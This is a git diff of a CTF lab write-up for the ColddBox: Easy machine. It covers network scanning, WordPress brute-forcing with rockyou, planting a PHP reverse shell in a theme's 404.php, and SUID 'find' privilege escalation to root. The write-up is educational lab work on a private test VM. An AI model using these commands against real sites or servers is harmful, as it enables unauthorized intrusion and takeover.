@@ -1,18 +1,19 @@
 # ColddBox : Easy
+
 Solved without using Metasploit
 
-Host Discovery Scanning 
+Host Discovery Scanning
 
 ```
 sudo netdiscover 192.168.69.0/24
 ```
 
-we found the machine running on `192.168.69.4` 
+we found the machine running on `192.168.69.4`
 
 Full Scan
 
 ```
-sudo nmap -sS -sV -sC -p- 192.168.69.4
+sudo nmap -sS -sV -sC -p- -oN full_scan.txt 192.168.69.4
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-25 02:25 CDT
 Nmap scan report for 192.168.69.4
 Host is up (0.000063s latency).
@@ -23,7 +24,7 @@ PORT     STATE SERVICE VERSION
 |_http-title: ColddBox | One more machine
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
 |   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
 |_  256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)
@@ -34,10 +35,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 9.08 seconds
 ```
 
-Another Recon Tool 
+Another Recon Tool
 
 ```
-└─$ sudo nikto -host http://192.168.69.4/
+└─$ sudo nikto -host http://192.168.69.4/ > nikto_scan.txt
 - Nikto v2.5.0
 ---------------------------------------------------------------------------
 + Target IP:          192.168.69.4
@@ -66,10 +67,10 @@ Another Recon Tool
 + 1 host(s) tested
 ```
 
-Directory Traversal 
+Directory Traversal
 
 ```
-└─$ gobuster dir -u http://192.168.69.4 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.xml,.txt
+└─$ gobuster dir -u http://192.168.69.4 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.xml,.txt > go_buster.txt
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -103,10 +104,10 @@ Starting gobuster in directory enumeration mode
 /server-status        (Status: 403) [Size: 277]
 ```
 
-Its running WordPress , let use `wpscan` for vulnerablities 
+Its running WordPress , let use `wpscan` for vulnerablities
 
 ```
-sudo wpscan --url http://192.168.69.4
+sudo wpscan --url http://192.168.69.4 > wpscan.txt
 [+] URL: http://192.168.69.4/ [192.168.69.4]
 [+] Started: Tue Jun 25 02:36:07 2024
 
@@ -162,7 +163,7 @@ Interesting Finding(s):
  |  - http://192.168.69.4/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'
 ```
 
-By Gobuster we got to know a path `hidden` , we got msg say  username `C0ldd` `Hugo` `Philip`
+By Gobuster we got to know a path `hidden` , we got msg say username `C0ldd` `Hugo` `Philip`
 
 <img src="./img/Pasted image 20240625130037.png" alt="Example Image" width="1080"/>
 
@@ -176,60 +177,59 @@ sudo wpscan --url http://192.168.69.4  -U c0ldd -P /usr/share/wordlists/rockyou.
 
 192.168.69.4/wp-admin
 
-<img src="./img/Pasted image 20240625131247.png" alt="Example Image" width="1080"/>
+<img src="./img/Pasted image 20240625131247.png" alt="Example Image" width="700"/>
 
 we got a admin access , its running Twenty Fifteen Theme
 
-<img src="./img/Pasted image 20240625131524.png" alt="Example Image" width="1080"/>
+<img src="./img/Pasted image 20240625131524.png" alt="Example Image" width="600"/>
 
 Go to Appearance --> Editor --> 404.php
 
 <img src="./img/Pasted image 20240625131953.png" alt="Example Image" width="1080"/>
 
-download this php reverse shell from monkey pentest  , modify the ip and port your machine 
+download this php reverse shell from monkey pentest , modify the ip and port your machine
 
 https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
 
 <img src="./img/Pasted image 20240625132123.png" alt="Example Image" width="1080"/>
 
-copy that file and paste in 404.php , and upload 
+copy that file and paste in 404.php , and upload
 
 <img src="./img/Pasted image 20240625132232.png" alt="Example Image" width="1080"/>
 
-start listener using netcat , at specified port , go to 404 error page 
+start listener using netcat , at specified port , go to 404 error page
 
 http://192.168.69.4/wp-content/themes/twentyfifteen/404.php
-
 
 <img src="./img/Pasted image 20240625132611.png" alt="Example Image" width="1080"/>
 
 we got a shell , but import proper bin/bash using python
 
-<img src="./img/Pasted image 20240625132952.png" alt="Example Image" width="1080"/>
+<img src="./img/Pasted image 20240625132952.png" alt="Example Image" width="700"/>
 
-in C0ldd folder we can't have privilege to cat user.txt , 
+in C0ldd folder we can't have privilege to cat user.txt ,
 
 ```
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-This command find which command as root `suid` permission 
+This command find which command as root `suid` permission
 \
-<img src="./img/Pasted image 20240625133306.png" alt="Example Image" width="1080"/>
+<img src="./img/Pasted image 20240625133306.png" alt="Example Image" width="900"/>
 
-`find` command can be used to escalate root privilege  
+`find` command can be used to escalate root privilege
 
 https://gtfobins.github.io/gtfobins/find/#suid
 
-form gtfobins we know and can have have root shell 
+form gtfobins we know and can have have root shell
 
 ```
 find . -exec /bin/sh -p \; -quit
 ```
 
-<img src="./img/Pasted image 20240625133834.png" alt="Example Image" width="1080"/>
+<img src="./img/Pasted image 20240625133834.png" alt="Example Image" width="700"/>
 
-we have been the machine , and got the root flag 
+we have been the machine , and got the root flag
 
 ```
 
@@ -238,12 +238,11 @@ root.txt
 cat root.txt
 wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
 echo "wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=" | base64 -d
-¡Felicidades, máquina completada!  
+¡Felicidades, máquina completada!
 
 cd /home/c0ldd
 cat user.txt
 echo "RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==" | base64 -d
-Felicidades, primer nivel conseguido! 
+Felicidades, primer nivel conseguido!
 
 ```
-
